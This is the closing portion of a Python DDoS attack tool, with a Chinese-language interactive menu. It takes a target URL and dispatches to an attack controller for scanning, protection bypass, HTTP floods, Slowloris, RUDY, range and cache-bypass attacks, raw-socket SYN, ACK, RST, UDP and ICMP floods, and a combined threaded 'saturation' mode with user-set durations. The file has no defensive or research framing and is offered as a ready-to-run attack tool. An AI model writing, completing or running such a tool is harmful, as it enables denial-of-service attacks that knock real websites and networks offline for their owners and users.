    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    controller = UltimateAttackController(target)
    
    print(f"\n  选择攻击模式:")
    print(f"  1 → 完整攻击链 (扫描 → 绕过 → DDoS)")
    print(f"  2 → 仅智能扫描")
    print(f"  3 → HTTP DDoS攻击")
    print(f"  4 → RAW Socket DDoS攻击")
    print(f"  5 → 混合饱和攻击")
    print(f"  0 → 退出")
    
    choice = input("\n  选择: ").strip()
    
    if choice == "1":
        duration = input("  攻击时长/秒 (默认60): ").strip()
        duration = int(duration) if duration else 60
        await controller.run_full_attack(scan=True, bypass=True, ddos_type="all", duration=duration)
        
    elif choice == "2":
        await controller.run_scan_phase()
        
    elif choice == "3":
        print(f"\n  HTTP攻击类型:")
        print(f"  1 → HTTP Flood (万级并发)")
        print(f"  2 → Slowloris (慢速连接)")
        print(f"  3 → RUDY (慢速POST)")
        print(f"  4 → Range Attack")
        print(f"  5 → Cache Bypass")
        print(f"  6 → 混合攻击")
        
        sub = input("  选择: ").strip()
        attack_map = {"1": "http_flood", "2": "slowloris", "3": "rudy", "4": "range", "5": "cache", "6": "all"}
        attack_type = attack_map.get(sub, "http_flood")
        
        duration = input("  攻击时长/秒 (默认60): ").strip()
        duration = int(duration) if duration else 60
        
        controller.resolve_target()
        await controller.run_http_ddos_phase(attack_type, duration)
        
    elif choice == "4":
        print(f"\n  RAW攻击类型:")
        print(f"  1 → SYN Flood")
        print(f"  2 → ACK Flood")
        print(f"  3 → RST Flood")
        print(f"  4 → UDP Flood")
        print(f"  5 → ICMP Flood")
        print(f"  6 → 全部")
        
        sub = input("  选择: ").strip()
        attack_map = {"1": "syn", "2": "ack", "3": "rst", "4": "udp", "5": "icmp", "6": "all"}
        attack_type = attack_map.get(sub, "all")
        
        duration = input("  攻击时长/秒 (默认60): ").strip()
        duration = int(duration) if duration else 60
        
        controller.resolve_target()
        controller.run_ddos_phase(attack_type, duration)
        
    elif choice == "5":
        duration = input("  攻击时长/秒 (默认120): ").strip()
        duration = int(duration) if duration else 120
        
        controller.resolve_target()
        
        # 同时启动RAW和HTTP攻击
        print(f"\n  启动混合饱和攻击...")
        
        # RAW攻击线程
        def raw_attack():
            controller.run_ddos_phase("all", duration)
        
        raw_thread = threading.Thread(target=raw_attack)
        raw_thread.daemon = True
        raw_thread.start()
        
        # HTTP攻击
        await controller.run_http_ddos_phase("all", duration)
        
        raw_thread.join(timeout=5)
        
    elif choice == "0":
        print("  退出")
    else:
        print("  无效选项")


def main():
    """入口函数"""
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\n\n  中断退出")
    except Exception as e:
        print(f"\n  错误: {e}")


if __name__ == "__main__":
    main()